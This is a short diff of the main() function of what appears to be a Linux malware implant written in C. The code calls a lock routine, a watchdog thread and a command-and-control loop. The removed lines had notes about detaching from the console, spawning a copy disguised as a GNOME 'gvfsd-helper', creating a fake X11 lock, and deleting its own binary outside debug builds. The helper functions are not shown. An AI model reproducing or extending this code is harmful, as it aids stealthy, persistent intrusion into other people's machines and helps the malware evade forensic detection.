@@ -48,18 +48,12 @@ int main(int argc, char *argv[]) {
         }while(true);
 
     }
-    //daemon(0, 0);  // detach from current console
-    //spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
-    //creating .X11/X0-lock
+
     create_lock(1);
 
      //session-dbus create
     spawn_thread_watchdog(1);
     c2_loop();
-
-    #ifndef DEBUG
-    self_delete(argv[0]); //  deleting this binary.
-    #endif
 
     return 0;
  }
